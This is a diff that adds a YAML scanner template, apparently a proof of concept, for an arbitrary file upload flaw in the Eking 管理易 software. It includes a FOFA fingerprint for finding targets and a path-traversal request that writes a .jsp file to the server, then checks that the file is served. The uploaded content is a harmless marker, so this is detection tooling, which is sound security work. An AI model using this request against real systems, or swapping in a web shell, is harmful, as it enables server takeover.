@@ -1,0 +1,22 @@
+id: poc-yaml-eking-base64upload-upload
+info:
+  name: Eking管理易 Base64Upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: EKing-管理易
+  fofa: app="EKing-管理易"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /Base64Upload.ihtm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: base64_str=data:image//../../../test{{.t1}}.jsp.;base64,dGVzdDEyM3Rlc3Q=
+  expression: "status_code == 200 && \ncontains(find_json(body,\"fileUrl\"), \".jsp\"\
+    )\n"
+- method: GET
+  path: /test{{.t1}}.jsp
+  expression: "status_code == 200 && \nbody == \"test123test\"\n"
+transport: http
